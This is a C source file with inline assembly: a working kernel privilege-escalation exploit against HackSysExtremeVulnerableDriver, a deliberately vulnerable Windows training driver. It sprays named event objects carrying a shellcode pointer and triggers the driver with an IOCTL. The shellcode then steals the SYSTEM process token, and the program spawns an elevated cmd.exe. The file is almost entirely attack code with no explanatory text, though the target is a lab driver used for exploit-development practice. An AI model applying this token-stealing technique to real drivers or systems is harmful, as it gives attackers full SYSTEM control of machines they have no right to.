#include <windows.h>
#include <stdio.h>
DWORD buf[0xf00];
HANDLE hDriver;
DWORD dwBytesOut = 0;
static VOID ShellCode()
{
	_asm
	{
		//int 3
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		ret
	}
}

int main() {
	char lpName[0xf0];

	memset(lpName, 0x41, 0xf0);

	HANDLE spray_event[256];
	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		return(-1);
	}
	//wchar_t lpName[0xf0]{};
	for (int i = 0; i <256; i++)
	{
		*(PDWORD)(lpName + 0x4) = (DWORD)&ShellCode;
		*(PDWORD)(lpName + 0xf0 - 4) = 0;
		spray_event[i]= CreateEventW(0, false, false, (LPCWSTR)lpName);
	}

	for (size_t i = 0; i <256; i++)
	{
		CloseHandle(spray_event[i]);
	}
	buf[0] = 0x1234;
	DeviceIoControl(hDriver, 0x222033, buf, 4, 0, 0, &dwBytesOut, NULL);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	return 0;
}
